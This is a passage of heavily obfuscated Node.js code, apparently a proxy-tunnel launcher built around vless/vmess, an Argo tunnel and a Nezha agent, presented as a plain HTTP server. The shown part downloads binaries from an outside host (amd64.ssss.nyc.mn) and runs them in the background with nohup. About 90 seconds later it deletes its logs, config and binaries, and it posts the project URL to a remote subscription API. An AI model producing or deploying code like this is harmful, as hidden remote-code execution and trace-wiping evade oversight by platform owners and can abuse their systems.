IlpEWXdZV1V3T0RVdE1EQm1OaTAwWWpVNUxXRm1NekV0Wm1FMVl6VXdPRFU0WmpSbSJ9','127.0.0.1','config.json','length','message','Error\x20reading\x20boot.log:','stringify','list.txt','abcdefghijklmnopqrstuvwxyz','https://amd64.ssss.nyc.mn/v1','isFile','vmess','env','2087','ArgoDomain:','success','\x20>/dev/null\x202>&1\x20&','\x20already\x20exists','\x0avless://','PORT','response','readFileSync','basename','Unknown','a2ca7a90-474d-4095-87ef-b81965187b18','https://amd64.ssss.nyc.mn/agent','http','App\x20is\x20running','ednh.ftmk.de5.net','ARGO_PORT','prototype','arm64','exec','/api/add-nodes','https+local://8.8.8.8/dns-query','firefox','/api/add-subscriptions','/tunnel.yml\x20run','none','stream','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','vless','php\x20running\x20error:\x20','return\x20(function()\x20','/dev/null','238920seGBnf','369890eJLZtw','apply','log','?encryption=none&security=tls&sni=','from','nohup\x20','countryCode','NAME'];_0x541d=function(){return _0x2d61e9;};return _0x541d();}function cleanFiles(){setTimeout(()=>{const _0x36d843=_0x5851,_0x223610=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x223610[_0x36d843(0x18c)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x223610[_0x36d843(0x18c)](phpPath);process[_0x36d843(0x15e)]==='win32'?exec('del\x20/f\x20/q\x20'+_0x223610[_0x36d843(0x1ba)]('\x20')+_0x36d843(0x16f),_0x377a76=>{const _0x4afb5c=_0x36d843;console[_0x4afb5c(0x214)](),console[_0x4afb5c(0x1f9)](_0x4afb5c(0x1e4)),console['log'](_0x4afb5c(0x1a8));}):exec(_0x36d843(0x209)+_0x223610[_0x36d843(0x1ba)]('\x20')+_0x36d843(0x176),_0x19526b=>{const _0x388e2a=_0x36d843;console[_0x388e2a(0x214)](),console[_0x388e2a(0x1f9)](_0x388e2a(0x1e4)),console['log'](_0x388e2a(0x1a8));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x261d0d=_0xb8b964;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x261d0d(0x1f9)](_0x261d0d(0x17f));return;}try{const _0x443ce7=await axios[_0x261d0d(0x16e)](_0x261d0d(0x1bc),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x261d0d(0x1f9)](_0x261d0d(0x198)),_0x443ce7;}catch(_0xe03cbf){return console[_0x261d0d(0x1a9)](_0x261d0d(0x201)+_0xe03cbf[_0x261d0d(0x1cd)]),null;}}async function startserver(){const _0x26dd74=_0xb8b964;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2eaf4f){console[_0x26dd74(0x1a9)]('Error\x20in\x20startserver:',_0x2eaf4f);}}startserver()[_0xb8b964(0x196)](_0x104d29=>{const _0x3c62c8=_0xb8b964;console[_0x3c62c8(0x1a9)](_0x3c62c8(0x179),_0x104d29);}),app[_0xb8b964(0x173)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
